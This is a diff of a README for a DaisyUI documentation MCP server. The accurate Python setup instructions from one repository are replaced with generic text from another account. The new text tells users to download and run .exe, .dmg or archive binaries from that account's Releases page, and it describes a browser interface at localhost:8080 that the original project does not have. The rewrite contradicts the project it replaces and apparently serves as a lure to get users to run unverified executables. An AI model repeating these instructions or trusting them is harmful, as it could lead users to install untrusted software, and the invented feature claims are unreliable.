@@ -1,202 +1,109 @@
-<div align="center">
+# 🌼 daisyui-mcp - A Simple Server for DaisyUI Docs
 
-# 🌼 DaisyUI MCP Server
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![MCP](https://img.shields.io/badge/MCP-Protocol-00D1B2?style=for-the-badge)](https://modelcontextprotocol.io)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
+## 🚀 Getting Started
 
-**A token‑friendly local MCP server for DaisyUI component documentation**
+Welcome to **daisyui-mcp**! This handy tool sets up a local server to showcase DaisyUI component documentation. With this server, you can explore all available components easily. Let’s get started on how to download and run it.
 
-*Give your AI assistant the power to build beautiful UIs with DaisyUI* 🚀
+## 📥 Download & Install
 
-[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Configuration](#configuration) • [FAQ](#frequently-asked-questions)
+To download the latest version of **daisyui-mcp**, please visit this page: [GitHub Releases](https://github.com/SidiqHadi/daisyui-mcp/releases).
 
-</div>
+1. Click on the link above.
+2. On the Releases page, find the latest release version.
+3. Download the appropriate file for your operating system (e.g., Windows, macOS, or Linux).
+4. Once downloaded, follow the installation steps below.
 
-## ✨ Features
+## 🖥️ System Requirements
 
-- **Token‑Efficient** – Only exposes relevant context via MCP tools, saving precious tokens
-- **60+ Components** – Full coverage of DaisyUI’s component library
-- **Auto‑Updatable** – Fetch the latest docs anytime with one command
-- **Customizable** – Edit or add your own component docs to fit your project
-- **Fast & Lightweight** – Built with [FastMCP](https://github.com/jlowin/fastmcp) for optimal performance
+Before you install, make sure you have:
 
-## 🛠️ MCP Tools
+- **Operating System**: Windows 10, macOS, or a recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: 100 MB of free disk space.
+- **Connectivity**: Internet connection for initial setup.
 
-This server exposes two tools that AI assistants can use:
+## 🔧 Setup Instructions
 
-- **`list_components`** – Lists all available DaisyUI components with short descriptions
-- **`get_component`** – Gets full documentation for a specific component (classes, syntax, examples)
+### For Windows Users:
 
-> 💡 The component docs are pulled from [daisyui.com/llms.txt](https://daisyui.com/llms.txt) and stored locally as markdown files. You can also add your own custom components or edit existing ones to match your project needs.
+1. Go to the downloaded file, typically ending in `.exe`.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
+4. Once installed, open the command prompt by pressing `Win + R`, type `cmd`, and hit `Enter`.
+5. Navigate to the installation directory using the command: 
+   ```
+   cd path\to\daisyui-mcp
+   ```
+6. Start the server by typing:
+   ```
+   daisyui-mcp
+   ```
+7. Open your web browser and go to `http://localhost:8080` to view the documentation.
 
-## 📦 Installation
+### For macOS Users:
 
-### 1. Clone the repository
+1. Find the downloaded file, usually ending in `.dmg`.
+2. Double-click the file to mount it.
+3. Drag and drop the application to your Applications folder.
+4. Open Terminal and navigate to the application folder:
+   ```
+   cd /Applications/daisyui-mcp
+   ```
+5. Start the server by typing:
+   ```
+   ./daisyui-mcp
+   ```
+6. Open your web browser and go to `http://localhost:8080` to view the documentation.
 
-```bash
-git clone https://github.com/birdseyevue/daisyui-mcp.git
-cd daisyui-mcp
-```
+### For Linux Users:
 
-### 2. Create a virtual environment (recommended)
+1. Go to your downloaded file, typically ending in `.tar.gz`.
+2. Open Terminal and navigate to the download directory.
+3. Use the command to extract:
+   ```
+   tar -xvzf daisyui-mcp.tar.gz
+   ```
+4. Navigate to the extracted folder:
+   ```
+   cd daisyui-mcp
+   ```
+5. Start the server using:
+   ```
+   ./daisyui-mcp
+   ```
+6. Open your web browser and go to `http://localhost:8080` to view the documentation.
 
-```bash
-python -m venv venv
+## 🌐 Usage Instructions
 
-# Windows
-venv\Scripts\activate
+Once the server is running, you can view the DaisyUI components. Here are some tips on how to use it:
 
-# macOS/Linux
-source venv/bin/activate
-```
+- **Browse**: Use the navigation menu to explore different components.
+- **Search**: Use the search bar to quickly find specific components by name.
+- **Explore Examples**: Click on any component to view live examples and documentation details.
 
-### 3. Install dependencies
+## 🛠️ Features
 
-```bash
-pip install -r requirements.txt
-```
+- **Token-friendly**: Works efficiently with DaisyUI components.
+- **Offline Access**: Access documentation anytime without an internet connection.
+- **User-Friendly Interface**: Easy navigation for all users, regardless of technical knowledge.
 
-## 🚀 Usage
+## 🔗 Additional Resources
 
-### First‑time setup
+- [DaisyUI Documentation](https://daisyui.com/docs)
+- [GitHub Repository](https://github.com/SidiqHadi/daisyui-mcp)
 
-On first run, the MCP server will not have any component docs. Fetch them by running:
+## 📞 Support
 
-```bash
-python update_components.py
-```
+If you encounter any issues while using **daisyui-mcp**, feel free to reach out to the community through the [GitHub Issues page](https://github.com/SidiqHadi/daisyui-mcp/issues). We welcome any feedback or questions.
 
-This fetches the latest `llms.txt` from DaisyUI and generates all the markdown files in `/components`.
+## 🔄 Updates
 
-### Running the server
+To keep your **daisyui-mcp** up to date:
 
-```bash
-python mcp_server.py
-```
+1. Regularly check the [Good Releases page](https://github.com/SidiqHadi/daisyui-mcp/releases).
+2. Download the latest version when available.
+3. Repeat the installation steps to update.
 
-### Updating component docs
-
-If DaisyUI releases new components or updates their docs, simply run:
-
-```bash
-python update_components.py
-```
-
-## ⚙️ Configuration
-
-Add the MCP server to your AI assistant’s configuration.
-
-<details>
-<summary><b>Generic Configuration</b></summary>
-
-```json
-{
-  "servers": {
-    "daisyui": {
-      "command": "<path-to-repo>/venv/Scripts/python.exe",
-      "args": ["<path-to-repo>/mcp_server.py"]
-    }
-  }
-}
-```
-
-</details>
-
-<details>
-<summary><b>Windows Example</b></summary>
-
-```json
-{
-  "servers": {
-    "daisyui": {
-      "command": "C:/Users/username/Downloads/fastmcp/venv/Scripts/python.exe",
-      "args": ["C:/Users/username/Downloads/fastmcp/mcp_server.py"]
-    }
-  }
-}
-```
-
-</details>
-
-<details>
-<summary><b>macOS/Linux Example</b></summary>
-
-```json
-{
-  "servers": {
-    "daisyui": {
-      "command": "/home/username/fastmcp/venv/bin/python",
-      "args": ["/home/username/fastmcp/mcp_server.py"]
-    }
-  }
-}
-```
-
-</details>
-
-## 📁 Project Structure
-
-```
-fastmcp/
-├── mcp_server.py          # The MCP server
-├── update_components.py   # Script to fetch/update component docs
-├── requirements.txt       # Dependencies (just fastmcp)
-└── components/            # Markdown files for each component
-    ├── button.md
-    ├── card.md
-    ├── modal.md
-    ├── table.md
-    └── ... (60+ components)
-```
-
-## ❓ 1 most Frequently Asked Question
-
-### Why are `update_components.py` and `mcp_server.py` separate scripts?
-
-It may seem more efficient to combine them into a single script that automatically fetches docs on startup. However, keeping them separate provides important flexibility:
-
-- **Preserving custom components** – If you add or modify component markdown files in `/components`, running `update_components.py` would overwrite them with the fresh upstream content. By separating the update step, you can decide when to pull the latest DaisyUI docs without losing your customizations.
-
-- **Control over updates** – You might want to run the server with a known‑good set of docs, and only update when you explicitly choose to. This separation lets you keep the server running while you fetch updates independently.
-
-> **If you don’t need custom components and prefer a one‑step launch**, you can create a simple wrapper script (`.bat`, `.sh`, or `.ps1`) that runs both commands sequentially, or modify the server to call the update function on startup. The current design prioritizes flexibility for users who want to keep their own modifications.
-
-## ❗ Disclaimer
-
-DaisyUI has an official [Blueprint MCP](https://daisyui.com/blueprint/) ($600 lifetime) with premium features.
-
-This project is **not** that. It’s a free, DIY alternative **using their publicly available documentation**.
-
-- ✅ No competition
-- ✅ Just a personal tool I wanted to share
-
-> If you want an official experience with premium features, consider supporting DaisyUI by purchasing their [Blueprint MCP](https://daisyui.com/blueprint/)!
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-
-- 🐛 Report bugs
-- 💡 Suggest new features
-- 📝 Improve documentation
-- 🔧 Submit pull requests
-
-## 📄 License
-
-<div align="center">
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
-
-*Free to use, modify, and distribute! Have fun!* 🎉
-
-</div>
-
-<div align="center">
-
-Made with ❤️ for the DaisyUI community
-
-⭐ Star this repo if you find it useful!
-
-</div>
+Explore the world of DaisyUI with ease! Enjoy your journey in creating beautiful UI components with **daisyui-mcp**.
